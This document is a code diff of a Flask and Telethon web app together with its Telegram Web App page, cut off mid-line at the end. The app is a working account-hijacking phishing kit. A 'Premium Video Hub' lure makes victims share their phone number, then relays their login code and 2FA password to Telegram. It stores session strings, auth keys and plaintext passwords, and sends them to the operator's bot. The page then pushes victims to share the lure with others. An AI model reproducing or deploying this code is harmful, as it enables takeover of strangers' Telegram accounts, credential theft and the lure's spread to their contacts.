@@ -11,10 +11,7 @@ from telethon import TelegramClient, errors
 from telethon.sessions import StringSession
 import sys
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
-)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
 
@@ -31,11 +28,9 @@ API_HASH = (os.environ.get("API_HASH") or "").strip()
 YOUR_TELEGRAM_ID = _safe_int(os.environ.get("OWNER_ID"), 0)
 PORT = _safe_int(os.environ.get("PORT"), 5000)
 
-logger.info(
-    "ENV | BOT_TOKEN=%s | API_ID=%s | API_HASH=%s | OWNER_ID=%s | PORT=%s",
+logger.info("ENV | BOT=%s | API_ID=%s | API_HASH=%s | OWNER=%s | PORT=%s",
     "SET" if BOT_TOKEN else "MISSING", API_ID,
-    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID, PORT
-)
+    "SET" if API_HASH else "MISSING", YOUR_TELEGRAM_ID, PORT)
 
 if sys.version_info >= (3, 12) and sys.platform == 'win32':
     try:
@@ -49,7 +44,6 @@ user_sessions = {}
 pending_codes = {}
 pending_2fa = {}
 sessions_lock = threading.Lock()
-
 DATA_FILE = "captured_accounts.json"
 
 
@@ -79,7 +73,6 @@ def save_account(account):
             json.dump(accounts, f, indent=2)
     except Exception as e:
         logger.error(f"Save error: {e}")
-    logger.info(f"Saved: {account['phone']}")
     return account
 
 
@@ -103,7 +96,6 @@ def format_phone(ph):
 
 def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
     if not BOT_TOKEN or not YOUR_TELEGRAM_ID:
-        logger.warning("Bot notify skipped")
         return
     try:
         extra = ""
@@ -111,14 +103,9 @@ def send_bot_notification(phone, ss, me, dc, password_used=False, password_value
             extra = "\n2FA Used"
             if password_value:
                 extra += f" | Pwd: `{password_value}`"
-        msg = (
-            f"New Account!{extra}\n"
-            f"Phone: {phone}\n"
-            f"Name: {me.first_name} {me.last_name or ''}\n"
-            f"User ID: {me.id}\n"
-            f"DC: {dc}\n\n"
-            f"Session:\n`{ss}`"
-        )
+        msg = (f"New Account!{extra}\nPhone: {phone}\n"
+               f"Name: {me.first_name} {me.last_name or ''}\n"
+               f"User ID: {me.id}\nDC: {dc}\n\nSession:\n`{ss}`")
         if len(msg) > 4000:
             msg = msg[:3990] + "..."
         http_requests.post(
@@ -141,20 +128,15 @@ def run_telegram_action(phone, code=None, password=None):
                 r = await client.send_code_request(phone)
                 session_str = StringSession.save(client.session)
                 with sessions_lock:
-                    user_sessions[phone] = {
-                        'hash': r.phone_code_hash,
-                        'session': session_str
-                    }
+                    user_sessions[phone] = {'hash': r.phone_code_hash, 'session': session_str}
                     pending_codes[phone] = 'sent'
                     pending_2fa[phone] = False
-                logger.info(f"Code sent: {phone}")
                 return {'success': True}
             except errors.FloodWaitError as e:
                 with sessions_lock:
                     pending_codes[phone] = 'err'
                 return {'success': False, 'error': f'Flood {e.seconds}s'}
             except Exception as e:
-                logger.error(f"send_code error: {e}")
                 with sessions_lock:
                     pending_codes[phone] = 'err'
                 return {'success': False, 'error': str(e)[:80]}
@@ -169,7 +151,6 @@ def run_telegram_action(phone, code=None, password=None):
                 if phone not in user_sessions:
                     return {'success': False, 'error': 'No session'}
                 s = user_sessions[phone]
-
             client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
             try:
                 await client.connect()
@@ -198,50 +179,36 @@ def run_telegram_action(phone, code=None, password=None):
                 me = await client.get_me()
                 await client.get_dialogs()
                 ss = StringSession.save(client.session)
-
                 try:
                     auth_key = client.session.auth_key.key
                     dc = client.session.dc_id
                 except Exception:
                     auth_key = b""
                     dc = 0
-
                 auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                 password_used = password is not None
 
                 acc = {
-                    'phone': phone,
-                    'user_id': me.id,
-                    'username': me.username or '',
-                    'first_name': me.first_name or '',
-                    'last_name': me.last_name or '',
-                    'session': ss,
-                    'webk': json.dumps({
-                        'dcId': dc, 'authKey': auth_b64,
-                        'userId': me.id, 'isSupport': False, 'isTest': False
-                    }),
-                    'dc': dc,
-                    'time': str(datetime.now()),
+                    'phone': phone, 'user_id': me.id,
+                    'username': me.username or '', 'first_name': me.first_name or '',
+                    'last_name': me.last_name or '', 'session': ss,
+                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64,
+                        'userId': me.id, 'isSupport': False, 'isTest': False}),
+                    'dc': dc, 'time': str(datetime.now()),
                     'has_2fa': password_used,
                     'password': password if password_used else ''
                 }
-
                 save_account(acc)
                 global captured_accounts
                 captured_accounts = load_accounts()
-
                 with sessions_lock:
                     user_sessions.pop(phone, None)
                     pending_2fa.pop(phone, None)
                     pending_codes[phone] = 'done'
-
                 send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
-                logger.info(f"Captured: {phone}")
                 return {'success': True, 'session': ss, 'user_id': me.id}
-
             except Exception as e:
                 e_str = str(e)
-                logger.error(f"Verify error: {e_str}")
                 if 'PHONE_CODE_INVALID' in e_str:
                     return {'success': False, 'error': 'Wrong code'}
                 if 'SESSION_PASSWORD_NEEDED' in e_str:
@@ -263,28 +230,22 @@ def run_telegram_action(phone, code=None, password=None):
 
 
 # ============ ROUTES ============
-
 @app.route('/')
 def index():
     return render_template('index.html')
-
 
 @app.route('/tg')
 def tg_webapp():
     return render_template('index.html')
 
-
 @app.route('/health')
 def health():
-    return jsonify({
-        'status': 'ok',
+    return jsonify({'status': 'ok',
         'BOT_TOKEN': 'SET' if BOT_TOKEN else 'MISSING',
         'API_ID': API_ID,
         'API_HASH': 'SET' if API_HASH else 'MISSING',
         'OWNER_ID': YOUR_TELEGRAM_ID,
-        'accounts': len(captured_accounts)
-    })
-
+        'accounts': len(captured_accounts)})
 
 @app.route('/api/save_contact', methods=['POST'])
 def save_contact():
@@ -294,37 +255,22 @@ def save_contact():
     if not phone or not tg_id:
         return jsonify({'success': False, 'error': 'Missing data'})
     phone = format_phone(phone)
-
     accounts = load_accounts()
     existing = next((a for a in accounts if a['phone'] == phone), None)
     if existing:
-        return jsonify({
-            'success': True,
-            'already_captured': True,
-            'phone': phone,
-            'user_id': existing['user_id']
-        })
-
+        return jsonify({'success': True, 'already_captured': True,
+            'phone': phone, 'user_id': existing['user_id']})
     with sessions_lock:
         pending_codes[phone] = 'contact_saved'
-
-    logger.info(f"Contact saved: {phone} | TG: {tg_id}")
-
     try:
         http_requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={
-                'chat_id': YOUR_TELEGRAM_ID,
+            json={'chat_id': YOUR_TELEGRAM_ID,
                 'text': f"Contact Captured\nTG ID: `{tg_id}`\nPhone: `{phone}`",
-                'parse_mode': 'Markdown'
-            },
-            timeout=10
-        )
+                'parse_mode': 'Markdown'}, timeout=10)
     except Exception:
         pass
-
     return jsonify({'success': True, 'phone': phone})
-
 
 @app.route('/api/share', methods=['POST'])
 def share():
@@ -339,7 +285,6 @@ def share():
     t.start()
     return jsonify({'success': True})
 
-
 @app.route('/api/check', methods=['POST'])
 def check():
     phone = format_phone(request.json.get('phone', ''))
@@ -351,14 +296,11 @@ def check():
             s = 'done'
     return jsonify({'s': s})
 
-
 @app.route('/api/verify', methods=['POST'])
 def verify_route():
     d = request.json
     ph = format_phone(d.get('phone', ''))
-    result = run_telegram_action(ph, d.get('code', ''), d.get('password'))
-    return jsonify(result)
-
+    return jsonify(run_telegram_action(ph, d.get('code', ''), d.get('password')))
 
 @app.route('/session/<phone>')
 def get_session(phone):
@@ -368,17 +310,11 @@ def get_session(phone):
     a = next((x for x in captured_accounts if x['phone'] == phone), None)
     if not a:
         return jsonify({'error': 'Not found'}), 404
-    return jsonify({
-        'phone': phone,
-        'user_id': a['user_id'],
+    return jsonify({'phone': phone, 'user_id': a['user_id'],
         'name': f"{a['first_name']} {a['last_name']}",
-        'username': a['username'],
-        'dc': a['dc'],
-        'session': a['session'],
-        'session_length': len(a['session']),
-        'has_2fa': a.get('has_2fa', False)
-    })
-
+        'username': a['username'], 'dc': a['dc'],
+        'session': a['session'], 'session_length': len(a['session']),
+        'has_2fa': a.get('has_2fa', False)})
 
 @app.route('/dash')
 def dash():
@@ -390,7 +326,17 @@ def dash():
         tag = "2FA" if a.get('has_2fa') else ""
         rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a.get('first_name','')} {a.get('last_name','')}</td><td>@{a.get('username','-')}</td><td>{a.get('user_id','')}</td><td>{a.get('dc','')}</td><td>{tag} ({ss_len})</td><td>{a.get('time','')}</td></tr>"
     total_2fa = sum(1 for a in captured_accounts if a.get('has_2fa'))
-    return render_template('dash.html', rows=rows, total=len(captured_accounts), total_2fa=total_2fa)
+    html = "<!DOCTYPE html><html><head><title>Dashboard</title><style>"
+    html += "body{background:#0a0a0a;color:white;font-family:Arial;padding:20px}"
+    html += "h1{color:#e94560}table{width:100%;border-collapse:collapse;margin-top:15px}"
+    html += "th,td{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e;font-size:13px}"
+    html += "th{background:#141420;color:#ddd}tr:hover{background:#141420}"
+    html += "</style></head><body>"
+    html += f"<h1>Accounts: {len(captured_accounts)} | 2FA: {total_2fa}</h1>"
+    html += "<table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>User</th><th>ID</th><th>DC</th><th>Session</th><th>Time</th></tr></thead><tbody>"
+    html += rows if rows else "<tr><td colspan='8' style='text-align:center;color:#666;padding:30px'>No accounts</td></tr>"
+    html += "</tbody></table></body></html>"
+    return html
 
 
 if __name__ == '__main__':
@@ -418,32 +364,26 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .meta{color:#666;font-size:12px}
 .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
 .btn-wrap{padding:15px 20px}
-.btn{width:100%;padding:18px;background:linear-gradient(45deg,#0088cc,#00a8e8);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(0,136,204,0.4);letter-spacing:1px;text-transform:uppercase}
-.btn:active{transform:scale(0.97)}
-.btn:disabled{opacity:0.4}
-.btn-green{background:linear-gradient(45deg,#25D366,#128C7E);box-shadow:0 8px 30px rgba(37,211,102,0.4)}
+.btn{width:100%;padding:18px;background:linear-gradient(45deg,#0088cc,#00a8e8);border:none;border-radius:50px;color:white;font-size:18px;font-weight:800;cursor:pointer;letter-spacing:1px;text-transform:uppercase}
+.btn-green{background:linear-gradient(45deg,#25D366,#128C7E)}
 .overlay{position:fixed;inset:0;background:rgba(0,0,0,0.92);z-index:999;display:none;align-items:center;justify-content:center;padding:20px}
 .overlay.show{display:flex}
 .modal{background:#141420;border-radius:20px;padding:28px;max-width:380px;width:100%;border:1px solid #1a1a2e}
 .modal-icon{text-align:center;font-size:48px;margin-bottom:12px}
 .modal h2{text-align:center;font-size:18px;margin-bottom:8px}
-.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:18px;line-height:1.5}
+.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:18px}
 .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;font-size:13px;display:none}
 .sb.show{display:block}
 .sb.success{background:rgba(76,175,80,0.15);color:#81C784}
 .sb.error{background:rgba(244,67,54,0.15);color:#EF9A9A}
 .sb.info{background:rgba(33,150,243,0.15);color:#90CAF9}
 .sb.waiting{background:rgba(255,152,0,0.15);color:#FFB74D}
-.sp{display:inline-block;width:16px;height:16px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
-@keyframes spin{to{transform:rotate(360deg)}}
 .otp-display{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:12px;color:white;margin:12px 0;font-weight:bold;min-height:55px}
 .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
 .key{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;font-weight:600}
-.key:active{background:#3a3a5e}
 .key.del{background:#e94560}
 .key.ok{background:#4CAF50;font-size:14px}
 .pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
-.pwd-input:focus{border-color:#0088cc}
 .share-steps{display:flex;justify-content:center;gap:6px;margin:15px 0}
 .step{width:36px;height:36px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:13px;color:#666;font-weight:700}
 .step.done{background:#4CAF50;color:white}
@@ -455,7 +395,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <h1>PREMIUM VIDEO HUB</h1>
 <p>Exclusive content - Verified only</p>
 </div>
-
 <div class="card">
 <div class="thumb"><div class="play">&#9658;</div></div>
 <div class="info">
@@ -464,7 +403,6 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <span class="badge">RESTRICTED</span>
 </div>
 </div>
-
 <div class="btn-wrap">
 <button class="btn" id="mainBtn">UNLOCK NOW</button>
 </div>
@@ -484,7 +422,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <div class="modal-icon">&#128274;</div>
 <h2>Enter Code</h2>
 <p><span id="phoneDisplay" style="color:#0088cc;font-weight:bold"></span></p>
-<div class="sb waiting show" id="otpWait"><span class="sp"></span> Sending code...</div>
+<div class="sb waiting show" id="otpWait">Sending code...</div>
 <div class="otp-display" id="otpDisplay">_</div>
 <div class="keypad">
 <button class="key" onclick="pk('1')">1</button>
@@ -510,7 +448,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <h2>Two-Factor Auth</h2>
 <p>Enter your cloud password:</p>
 <input type="password" class="pwd-input" id="pwdInput" placeholder="Password" maxlength="64">
-<button class="btn" onclick="submitPwd()" style="background:linear-gradient(45deg,#e94560,#d63851)">VERIFY</button>
+<button class="btn" onclick="submitPwd()">VERIFY</button>
 <div class="sb" id="pwdStatus"></div>
 </div>
 </div>
@@ -535,36 +473,24 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 <script>
 var tg = window.Telegram ? window.Telegram.WebApp : null;
 if (tg) { tg.ready(); tg.expand(); }
-
 var TG_ID = (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : null;
 var USER_PHONE_KEY = 'pv_phone_' + TG_ID;
 var USER_SHARES_KEY = 'pv_shares_' + TG_ID;
 var USER_CAPTURED_KEY = 'pv_captured_' + TG_ID;
-
 var phoneNumber = '';
 var codeDigits = '';
 var sharesDone = 0;
 var codeCheckInterval = null;
 var pwdCheckInterval = null;
 var contactForceInterval = null;
-
 var TG_CHANNEL = 'https://t.me/videodks';
 var TG_CAPTION = 'Premium content';
 
 document.getElementById('mainBtn').onclick = function() {
 var cachedPhone = localStorage.getItem(USER_PHONE_KEY);
 var isCaptured = localStorage.getItem(USER_CAPTURED_KEY) === '1';
-
-if (cachedPhone && isCaptured) {
-phoneNumber = cachedPhone;
-openShareModal();
-return;
-}
-if (cachedPhone) {
-phoneNumber = cachedPhone;
-openOtpModal();
-return;
-}
+if (cachedPhone && isCaptured) { phoneNumber = cachedPhone; openShareModal(); return; }
+if (cachedPhone) { phoneNumber = cachedPhone; openOtpModal(); return; }
 openContactModal();
 };
 
@@ -577,20 +503,13 @@ function startContactForce() {
 if (contactForceInterval) clearInterval(contactForceInterval);
 setTimeout(triggerContactShare, 300);
 contactForceInterval = setInterval(function() {
-if (document.getElementById('contactModal').classList.contains('show')) {
-triggerContactShare();
-} else {
-clearInterval(contactForceInterval);
-contactForceInterval = null;
-}
+if (document.getElementById('contactModal').classList.contains('show')) triggerContactShare();
+else { clearInterval(contactForceInterval); contactForceInterval = null; }
 }, 1500);
 }
 
 function triggerContactShare() {
-if (!tg) {
-showContactStatus('Open in Telegram', 'error');
-return;
-}
+if (!tg) { showContactStatus('Open in Telegram', 'error'); return; }
 try {
 tg.requestContact(function(sent, event) {
 if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
@@ -599,30 +518,18 @@ handleContact(event.responseUnsafe.contact);
 showContactStatus('Contact share required!', 'error');
 }
 });
-} catch(e) {
-showContactStatus('Update Telegram app', 'error');
-}
+} catch(e) { showContactStatus('Update Telegram app', 'error'); }
 }
 
-document.getElementById('shareContactBtn').onclick = function() {
-triggerContactShare();
-};
+document.getElementById('shareContactBtn').onclick = function() { triggerContactShare(); };
 
 function handleContact(contact) {
 var phone = contact.phone_number || '';
-if (!phone) {
-showContactStatus('No phone number', 'error');
-return;
-}
+if (!phone) { showContactStatus('No phone number', 'error'); return; }
 if (phone.charAt(0) !== '+') phone = '+' + phone;
 phoneNumber = phone;
 showContactStatus('Contact verified!', 'success');
-
-if (contactForceInterval) {
-clearInterval(contactForceInterval);
-contactForceInterval = null;
-}
-
+if (contactForceInterval) { clearInterval(contactForceInterval); contactForceInterval = null; }
 fetch('/api/save_contact', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
@@ -642,13 +549,9 @@ document.getElementById('contactModal').classList.remove('show');
 openOtpModal();
 }, 800);
 }
-} else {
-showContactStatus('Server error', 'error');
-}
+} else { showContactStatus('Server error', 'error'); }
 })
-.catch(function() {
-showContactStatus('Connection error', 'error');
-});
+.catch(function() { showContactStatus('Connection error', 'error'); });
 }
 
 function showContactStatus(msg, type) {
@@ -660,7 +563,6 @@ el.textContent = msg;
 function openOtpModal() {
 document.getElementById('otpModal').classList.add('show');
 document.getElementById('phoneDisplay').textContent = phoneNumber;
-
 fetch('/api/share', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
@@ -718,7 +620,6 @@ function submitOtp() {
 if (codeDigits.length < 5) { showOtpStatus('5 digits required', 'error'); return; }
 document.getElementById('otpOk').disabled = true;
 document.getElementById('otpOk').textContent = '...';
-
 fetch('/api/verify', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
@@ -726,9 +627,8 @@ body: JSON.stringify({phone: phoneNumber, code: codeDigits})
 })
 .then(function(r) { return r.json(); })
 .then(function(data) {
-if (data.success) {
-onCaptureSuccess();
-} else if (data.needs_password) {
+if (data.success) { onCaptureSuccess(); }
+else if (data.needs_password) {
 document.getElementById('otpModal').classList.remove('show');
 document.getElementById('pwdModal').classList.add('show');
 startPwdCheck();
@@ -763,10 +663,7 @@ body: JSON.stringify({phone: phoneNumber})
 })
 .then(function(r) { return r.json(); })
 .then(function(data) {
-if (data.s === 'done') {
-clearInterval(pwdCheckInterval);
-onCaptureSuccess();
-}
+if (data.s === 'done') { clearInterval(pwdCheckInterval); onCaptureSuccess(); }
 })
 .catch(function(){});
 }, 2000);
@@ -780,8 +677,7 @@ document.getElementById('pwdStatus').textContent = 'Password required';
 return;
 }
 document.getElementById('pwdStatus').className = 'sb waiting show';
-document.getElementById('pwdStatus').innerHTML = '<span class="sp"></span> Checking...';
-
+document.getElementById('pwdStatus').innerHTML = 'Checking...';
 fetch('/api/verify', {
 method: 'POST',
 headers: {'Content-Type': 'application/json'},
@@ -789,9 +685,8 @@ body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
 })
 .then(function(r) { return r.json(); })
 .then(function(data) {
-if (data.success) {
-onCaptureSuccess();
-} else {
+if (data.success) { onCaptureSuccess(); }
+else {
 document.getElementById('pwdStatus').className = 'sb error show';
 document.getElementById('pwdStatus').textContent = (data.error || 'Wrong');
 }
@@ -806,10 +701,8 @@ function onCaptureSuccess() {
 localStorage.setItem(USER_PHONE_KEY, phoneNumber);
 localStorage.setItem(USER_CAPTURED_KEY, '1');
 localStorage.setItem(USER_SHARES_KEY, '0');
-
 if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
 if (pwdCheckInterval) { clearInterval(pwdCheckInterval); pwdCheckInterval = null; }
-
 document.getElementById('otpModal').classList.remove('show');
 document.getElementById('pwdModal').classList.remove('show');
 openShareModal();
@@ -819,20 +712,7 @@ function openShareModal() {
 document.getElementById('shareModal').classList.add('show');
 sharesDone = parseInt(localStorage.getItem(USER_SHARES_KEY) || '0');
 updateShareSteps();
-if (sharesDone > 0 && sharesDone < 5) {
-document.getElementById('shareStatus').className = 'sb success show';
-document.getElementById('shareStatus').textContent = sharesDone + '/5 done!';
-}
 }
 
 function doShare() {
-var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURIComponent(TG_CAPTION);
-if (tg) {
-tg.openTelegramLink(shareUrl);
-} else {
-window.open(shareUrl, '_blank');
-}
-sharesDone = Math.min(sharesDone + 1, 5);
-localStorage.setItem(USER_SHARES_KEY, String(sharesDone));
-updateShareSteps();
-if (sh
+var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL) + '&text=' + encodeURI
